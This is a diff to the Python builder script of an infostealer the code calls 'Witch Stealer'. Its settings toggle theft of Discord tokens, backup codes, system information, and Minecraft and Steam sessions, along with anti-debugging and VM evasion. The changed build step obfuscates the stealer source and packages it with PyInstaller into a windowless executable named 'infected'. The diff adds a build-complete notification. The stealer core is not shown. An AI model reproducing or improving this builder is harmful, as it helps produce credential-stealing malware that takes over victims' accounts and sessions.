@@ -18,13 +18,14 @@ from rich.console import Console
 from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, SpinnerColumn                                                                                                                                                                                                                                                                                                                                                                                          # Witch❤️
 from rich import print as rprint
 from datetime import *
+from plyer import notification
 
 from utils.module.Obfuscators import Obfuscators # Restored because obfscator was not the problem
 
 os.system("cls")
 obf = Obfuscators(include_imports=True, recursion=5)
 
-version = "v1.31.5"
+version = "v1.32.2"
 CONFIG_KEYS = ["Anti_Debugs_VM", "discord", "backupcode", "system", "minecraft", "Steam"]
 ENABLE_KEYS = ["Anti Debug / VM","Discord Steal", "BACKUPCODE STEAL", "System INFO", "Minecraft Session Steal", "Steam Session Steal"]
 PATH = "src/stealer_core/src.py"
@@ -103,17 +104,27 @@ def build():
         data = response.json()
         latest_version = data["info"]["version"]
         log_debug(f"Installing Latest Build Pyinstaller | {latest_version}")
-
-        os.system(f"pip install pyinstaller=={latest_version}")
+        subprocess.run(["pip", "install", f"pyinstaller=={latest_version}"], shell=True)
     else:
         log_debug("Failed to fetch PyInstaller version from PyPI, installing default...")
-        os.system("pip install pyinstaller")
-    
-    os.system("pyinstaller --version")
-    os.system("pyinstaller --help")
+        subprocess.run(["pip", "install", "pyinstaller"], shell=True)
+
+    subprocess.run(["pyinstaller", "--version"], shell=True)
+    subprocess.run(["pyinstaller", "--help"], shell=True)
     print(f"{Fore.LIGHTBLUE_EX}[Pyinstaller]{Fore.RESET} Start Build Process")
-    os.system('pyinstaller --onefile --clean --noconsole --name="infected" --icon=src/ico.ico --upx-dir=src/upx src/stealer_core/src.py')
+    subprocess.run([
+        "pyinstaller", "--onefile", "--clean", "--noconsole",
+        "--name=infected", "--icon=src/ico.ico", "--upx-dir=src/upx",
+        "src/stealer_core/src.py"
+    ], shell=True)
     print(f"{Fore.LIGHTBLUE_EX}[Pyinstaller]{Fore.RESET} Build Finished.")
+    notification.notify(
+    title='Build Completed.',
+    message='The build is complete, please check the dist.',
+    app_name=f'Witch Stealer Builder v{version}',
+    timeout=5  
+)
+
 
 def main():
     config = {}
